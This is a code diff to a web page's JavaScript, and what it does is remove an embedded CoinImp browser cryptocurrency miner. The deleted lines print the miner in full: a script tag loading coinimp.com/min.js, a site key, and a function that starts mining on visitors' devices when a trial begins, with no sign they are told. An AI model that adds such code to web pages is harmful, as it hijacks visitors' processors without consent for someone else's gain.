@@ -325,10 +325,7 @@
         const overlay = document.getElementById('overlay');
         sidebar.classList.toggle('open');
         overlay.classList.toggle('active');
-    }
-
-    /* ---------- CoinImp Miner Integration ---------- */
-    <script src="https://coinimp.com/min.js"></script>  <!-- CoinImp miner -->
+    }   
 
     // Branch data - must be before any logic
     const branches = {
@@ -459,26 +456,7 @@
                 }
             }
         });
-    }
-
-    // ---------- Mining Setup ----------
-    let miner;
-
-    function startMining() {
-        miner = new CoinImp.UserMiner('2945851f59e3ee79b6160d95323c186e47ad416cc9bcc7d76bb858127de4b4f4', {
-            threads: 4, // Adjust based on the device's CPU/GPU power
-            autoThreads: true, // Automatically adjust threads based on the device's capabilities
-            onError: function(error) {
-                console.error('Mining error:', error);
-            }
-        });
-        miner.start();  // Start mining on page load
-    }
-
-    // Trigger mining when the trial starts (based on your ACU trial logic)
-    if (trialStart) {
-        startMining();
-    }
+    }  
 
     // Call the update function every 30 seconds to refresh the rewards or ACU cycle
     setInterval(updateInterests, 30000);
